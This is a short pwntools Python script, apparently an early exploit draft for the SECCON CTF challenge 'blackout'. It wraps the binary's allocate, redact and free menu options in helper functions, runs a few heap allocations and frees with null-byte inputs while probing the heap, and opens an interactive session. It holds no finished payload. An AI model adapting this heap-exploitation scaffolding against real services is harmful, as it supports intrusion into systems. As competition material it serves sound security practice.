from pwn import *
elf_file = FILENAME = './blackout'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


HOST = 'blackout.seccon.games'
POST = 9999
#libc = ELF("./libc.so.6")


if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''b *main+123''')
recv = ""
def malloc(i,n,s):
    c.sendlineafter(">","1")
    c.sendlineafter("Index",str(i))
    c.sendlineafter("Size",str(n))
    c.sendlineafter("Str",s)
    sleep(0.1)

def bo(i,s):
    c.sendlineafter(">",'2')
    c.sendlineafter("Index",str(i))
    c.sendlineafter("redact:",s)
    c.recvuntil("[Redacted]")
    recv = c.recvline()#.rstrip()
    sleep(0.1)

def dis(i):
    c.sendlineafter(">","3")
    c.sendlineafter("Index",str(i))
    sleep(0.1)

malloc(0,23,"\x00")
dis(0)
malloc(0,23,"a"*22)
bo(0,'\x00')

c.interactive()

